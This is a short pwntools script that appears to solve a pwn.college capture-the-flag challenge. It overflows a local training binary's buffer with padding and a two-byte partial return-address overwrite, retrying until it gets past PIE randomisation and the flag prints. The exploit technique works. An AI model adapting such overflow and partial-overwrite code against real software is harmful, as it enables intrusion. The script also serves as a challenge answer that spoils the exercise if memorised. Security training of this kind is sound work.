"""PIE bypass: brute-force base address to hit target function."""
from pwn import *
from pwn import p16, p32, process
import itertools

binary_path = "/challenge/binary-exploitation-pie-overflow-w"

padding = b"A" * 0x40 + b"B" * 8

for count in itertools.count():
    p = process(binary_path)

    win_val = p16(0x1A2B)
    payload = padding + win_val
    p.send(payload)
    output = p.clean(timeout=0.114514)

    if b"pwn.college{" in output:
        print(f"[+] Try {count}")
        print(output.decode('utf-8', errors='ignore'))
        p.close()
        break
    p.close()
